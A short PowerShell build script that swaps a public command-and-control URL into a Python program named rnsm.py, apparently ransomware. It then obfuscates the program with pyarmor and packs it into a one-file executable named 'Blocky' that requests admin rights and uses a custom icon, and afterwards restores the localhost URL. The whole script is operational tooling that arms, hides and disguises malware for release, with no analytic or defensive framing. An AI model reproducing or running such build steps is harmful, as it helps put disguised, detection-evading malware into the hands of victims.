$c2_url = "https://rnsm.uber.space"

# Replace development C2 URL with correct public C2 URL
((Get-Content -Path ..\rnsm.py -Raw) -replace 'http://localhost:5000',$c2_url) | Set-Content -Path ..\rnsm.py

# Obfuscate and pack the script -> exe
pyarmor.exe pack --name=Blocky --output=.\ -e "--uac-admin --icon=favicon.ico --onefile --console --hidden-import _cffi_backend" ..\rnsm.py

# Return to development C2 URL
((Get-Content -Path ..\rnsm.py -Raw) -replace $c2_url,'http://localhost:5000') | Set-Content -Path ..\rnsm.py